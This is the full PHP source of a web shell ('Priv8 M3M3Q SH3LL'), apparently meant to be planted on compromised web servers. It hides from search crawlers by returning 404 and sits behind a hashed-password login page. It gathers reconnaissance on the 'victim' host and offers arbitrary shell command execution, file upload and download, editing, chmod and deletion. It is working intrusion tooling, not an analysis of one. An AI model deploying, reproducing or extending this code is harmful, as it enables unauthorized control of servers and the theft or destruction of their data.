
<?php
session_start();
error_reporting(0);
set_time_limit(0);

$auth_pass = "6ce4d0fb0743d2c9160ddad37ee0d204"; // default: KONTOLANJING
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
	
<link href='https://s5.gifyu.com/images/FB_IMG_15785102018497984.jpg' rel='SHORTCUT ICON'/>
<title>|\/|1|\|1  5|-|3|_|_</title>
 <script type="text/javascript">



var snowmax=35

var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")

var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")

var snowletter="*"

var sinkspeed=0.6

var snowmaxsize=22

var snowminsize=8

var snowingzone=1



// Do not edit below this line

var snow=new Array()

var marginbottom

var marginright

var timer

var i_snow=0

var x_mv=new Array();

var crds=new Array();

var lftrght=new Array();

var browserinfos=navigator.userAgent 

var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)

var ns6=document.getElementById&&!document.all

var opera=browserinfos.match(/Opera/)  

var browserok=ie5||ns6||opera



function randommaker(range) {		

	rand=Math.floor(range*Math.random())

    return rand

}



function initsnow() {

	if (ie5 || opera) {

		marginbottom = document.body.clientHeight

		marginright = document.body.clientWidth

	}

	else if (ns6) {

		marginbottom = window.innerHeight

		marginright = window.innerWidth

	}

	var snowsizerange=snowmaxsize-snowminsize

	for (i=0;i<=snowmax;i++) {

		crds[i] = 0;                      

    	lftrght[i] = Math.random()*15;         

    	x_mv[i] = 0.03 + Math.random()/10;

		snow[i]=document.getElementById("s"+i)

		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]

		snow[i].size=randommaker(snowsizerange)+snowminsize

		snow[i].style.fontSize=snow[i].size

		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]

		snow[i].sink=sinkspeed*snow[i].size/5

		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}

		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}

		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}

		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}

		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)

		snow[i].style.left=snow[i].posx

		snow[i].style.top=snow[i].posy

	}

	movesnow()

}



function movesnow() {

	for (i=0;i<=snowmax;i++) {

		crds[i] += x_mv[i];

		snow[i].posy+=snow[i].sink

		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);

		snow[i].style.top=snow[i].posy

		

		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){

			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}

			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}

			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}

			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}

			snow[i].posy=0

		}

	}

	var timer=setTimeout("movesnow()",50)

}



for (i=0;i<=snowmax;i++) {

	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")

}

if (browserok) {

	window.onload=initsnow

}

</script>

<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: black;
	text-align: center;
}
header {
	color: black;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: black;
	background: #000000;
	border: 1px black;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
<p>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
//password until here 
?>
<?php
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="https://s5.gifyu.com/images/FB_IMG_15785102018497984.jpg" rel="HORTCUT ICON">
<link href="" rel="stylesheet" type="text/css">
<title>.: |\/| 1 |\| 1   5 H 3 |_ |_ :.</title>


<style>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
@import url(http://fonts.googleapis.com/css?family=Wallpoet);
body{
font-family: "Ubuntu";
font-size: 13px;
background-color: #202020;
color:white;
}
#content tr:hover{
background-color: #2e9186;
color: ##2e9186;
text-shadow:4px 4px 10px #2e9186;
}
#content .first{
background-color: #2e9186;
}
table{
border: 0px #2e9186 solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #2e9186;
}
input{
background: #000;
color: #ff00c8;
-moz-border-radius: 5px;
border-radius:5px;}

select,textarea{
border: 1px #191970 solid;
background: #2e9186;
color: #ff00c8;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
<center>
	<img  src="https://i.ibb.co/4ZjXfW5/1581112599913.jpg" width="400" height="400">
<font color=lime> _______________________________________________________________
<p>
</center>
</head>
<link href="http://fonts.googleapis.com/css?family=Wallpoet" rel="stylesheet" type="text/css">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">';
echo '<tr>';
//Starting About victim
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
/*fuction hdd*/
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$freespace = hdd(disk_free_space("/"));
/*Code hdd*/
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$mysql = (function_exists('mysql_connect')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
/*code wget python perl*/
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=blue>OFF</font>";
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=blue>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
//eksekusi
echo "Name of Shell: <font style='color:#00f;text-shadow:5px 5px 12px #191970;font-size:15px' face='Wallpoet'>Priv8 M3M3Q SH3LL v 1.8.7</font><br>";
echo "System: <font color=magenta>".$kernel."</font><br>";
echo "Safe Mode:  $sm<br><font color=teal>";
echo "Disable Functions: $show_ds<br><font colot=chocolate>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=red>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Group: <font color=deeppink>".$group."</font> (".$gid.") User: <font color=purple>".$user."</font> (".$uid.") <br>";
echo "HardDisk: <font color=yellow>$used</font> / <font color=aqua>$total</font> ( Free: <font color=green>$freespace</font> )<br>";
echo "MySQL: $mysql | Curl: $curl | Perl: $perl | Python: $python | WGET: $wget ";
//ending about victim
//starting home bar
echo "<ul>";
echo "<center>[ <a href='?'>Home</a> ] [ <a href='?dir=$dir&do=cmd'>Console</a> ] [ <a style='color: red;' href='?logout=true'>Logout</a> ]</center>";
echo "</ul>";
//fuction menu bar
if($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='color: #ff00c8;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='Enter'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} 
//ending home bar
echo '</tr>';
echo '<tr><td><font color="green">Current Dir :</font> ';

//Code Menu
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="lime">Upload Berhasil Kontol</font><br /></center>';
}else{
echo '<center><font color="red">Upload Gagal Memeq</font><br/></center>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</center></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Set Permission Berhasil Kontol</font><br/>';
}else{
echo '<font color="red">Set Permission Gagal Memeq</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Ganti Nama Berhasil Kontol</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal Memeq</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Berhasil Edit File Kontol</font><br/>';
}else{
echo '<font color="red">Gagal Edit File Memeq</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terhapus Tolol</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus Goblok                                                                                                                                                                                                                                                                                            </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Terhapus Bajingan</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus Bangsat</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="1250" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Type</peller></center></td>
<td><center>Last Modify</peller></center></td>
<td><center>Owner/Group</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Action</peller></center></td>
</tr>';
//For Code Column Directory
foreach($scandir as $dir){
$dtype = filetype("$dir/$dirx");
$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
echo "<td><center>$dtype</center></td>";
echo "<td><center>$dtime</center></td>";
echo "<td><center>$downer/$dgrp</center></td>";
echo "<td><center>--</center></td>
<td><center>";
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value="GO">
</form></center></td>
</tr>';
}
//Code For File Column
foreach($scandir as $file){
$ftype = filetype("$path/$file");
$ftime = date("F d Y g:i:s", filemtime("$path/$file"));
if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$path/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$path/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$path/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$path/$file");
			}
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>';
echo "<td><center>$ftype</center></td>";
echo "<td><center>$ftime</center></td>";
echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
echo "<td><center>$size</center></td>
<td><center>";
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value="GO">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<center><hr width=280 color=grey>Copyright &copy; ".date("Y")." - <a href='https://facebook.com/adek.caper.3'><font color=green>OMEST GANZ</font></a></center>
</body>
</html>";
//Function Code HDD + exe
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
